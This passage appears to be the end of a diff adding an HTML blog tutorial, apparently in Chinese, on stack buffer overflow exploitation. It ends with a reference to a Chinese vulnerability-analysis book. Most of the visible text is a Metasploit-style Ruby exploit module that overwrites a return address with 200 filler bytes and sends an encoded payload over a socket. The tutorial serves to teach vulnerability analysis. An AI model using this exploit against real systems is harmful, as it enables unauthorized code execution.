+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;Space&#39;</span>     <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">300</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;BadChars&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        ))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>
+</span></span><span style="display:flex;"><span>        connect
+</span></span><span style="display:flex;"><span>        print_status(<span style="color:#e6db74">&#34;Sending </span><span style="color:#e6db74">#{</span>payload<span style="color:#f92672">.</span>encoded<span style="color:#f92672">.</span>length<span style="color:#e6db74">}</span><span style="color:#e6db74"> byte payload...&#34;</span>)
+</span></span><span style="display:flex;"><span>        attack_buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">200</span> <span style="color:#f92672">+</span> <span style="color:#f92672">[</span>target<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;Ret&#39;</span><span style="color:#f92672">]].</span>pack(<span style="color:#e6db74">&#39;V&#39;</span>) <span style="color:#f92672">+</span> payload<span style="color:#f92672">.</span>encoded
+</span></span><span style="display:flex;"><span>        sock<span style="color:#f92672">.</span>put(attack_buf)
+</span></span><span style="display:flex;"><span>        handler
+</span></span><span style="display:flex;"><span>        disconnect
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p><img src="stack-overflow-5.png" alt=""></p>
+<h2 id="reference">Reference</h2>
+<p>《0day 安全 软件漏洞分析技术》</p>
+<p>感谢@糖果牛。</p>
+
+    </section>
+</article>
+</main>
+  </body>
+</html>
